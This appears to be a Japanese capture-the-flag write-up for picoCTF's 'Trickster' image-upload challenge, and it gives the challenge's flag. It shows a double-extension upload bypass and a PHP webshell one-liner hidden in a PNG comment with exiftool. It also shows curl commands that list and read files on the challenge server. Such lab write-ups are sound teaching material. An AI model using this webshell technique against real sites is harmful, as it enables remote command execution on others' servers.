# Trickster:Web Exploitation:300pts
I found a web app that can help process images: PNG images only!  
Try it [here](http://atlas.picoctf.net:60018/)!  

# Solution
URLが渡されるのでアクセスすると、PNGをアップロードできるサイトのようだ。  
![site.png](site/site.png)  
適当な`test.png`をアップロードすると以下のように表示される。  
```
File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
```
アップロード先は教えられない。  
おそらくwebshellの設置問題と予想し、ファイル名を`test.php`にすると以下の通り怒られる。  
```
Error: File name does not contain '.png'.
```
`.png`をファイル名に含めればよいらしいので、`test.png.php`としてやればよい。  
これでアップロードに成功するが、画像を閲覧するパスがわからず、ファイル名によるトラバーサルも有効でない。  
ふと`robots.txt`を見ると以下の通りであった。  
```bash
$ curl http://atlas.picoctf.net:60018/robots.txt
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
`/uploads/`なる怪しい場所がある。  
ここにアップロードされるようなので、以下のファイルを`file.png.php`としてアップロードする。  
```php
<?php system($_GET["cmd"]); ?>
```
すると以下の通り怒られる。  
```
Error: The file is not a valid PNG image: 3c3f7068
```
PNGかどうかチェックしているようだ。  
正常なPNGファイルにwebshellとなる文字列を含ませたPolyglotを作ってやればよい。  
以下のようにコメントを利用した、`attack.png.php`を作成する。  
```bash
$ exiftool -Comment='<?php system($_GET["cmd"]); ?>' satoki.png
    1 image files updated
$ cp satoki.png attack.png.php
```
アップロードを行った後、以下のようにwebshellからコマンドを実行する。  
```bash
$ curl -s 'http://atlas.picoctf.net:60018/uploads/attack.png.php?cmd=ls' | strings
IHDR
sRGB
gAMA
        pHYs
&tEXtComment
attack.png.php
test.png
test.png.php
~~~
$ curl -s 'http://atlas.picoctf.net:60018/uploads/attack.png.php?cmd=ls%20../' | string
~~~
MQZWCYZWGI2WE.txt
index.php
instructions.txt
robots.txt
uploads
~~~
$ curl -s 'http://atlas.picoctf.net:60018/uploads/attack.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt' | strings
~~~
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b} */
~~~
```
一つ上に`MQZWCYZWGI2WE.txt`なるファイルがあり、flagが書かれていた。  

## picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}